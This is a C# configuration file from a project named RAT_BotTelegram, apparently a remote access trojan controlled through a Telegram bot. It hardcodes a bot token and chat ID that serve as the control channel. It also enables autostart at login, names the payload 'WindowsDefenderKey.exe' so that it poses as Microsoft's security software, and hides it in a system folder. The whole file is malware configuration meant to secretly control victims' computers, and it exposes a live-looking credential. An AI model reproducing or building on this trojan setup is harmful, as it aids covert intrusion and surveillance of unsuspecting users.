using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RAT_BotTelegram {
    internal sealed class config {

        // Configuración Inicio
        public const string TToken = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8";  // Token Bot
        public const string id= "831756903";                                          // ID Chat

        // Config Trojan
        public const bool   StarUp = true;    // Se inicia automaticamente al iniciar sesión
        
        public const string NameEXE = "WindowsDefenderKey.exe";  // Nombre Dele ejecutable Final
        public const bool   Ocul = true;      // Se oculta en el sistema
        public const string PathOcul = @"C:\public\Data";      // Ruta donde se esconde
        public const bool   ConsoleDebug = true;        // Modo debug =>> Muestra consola al ejecutarse
        public const int    delay = 1;                  // Delay despues de iniciar el sistema // Para computadoras sin SSD

    }
}
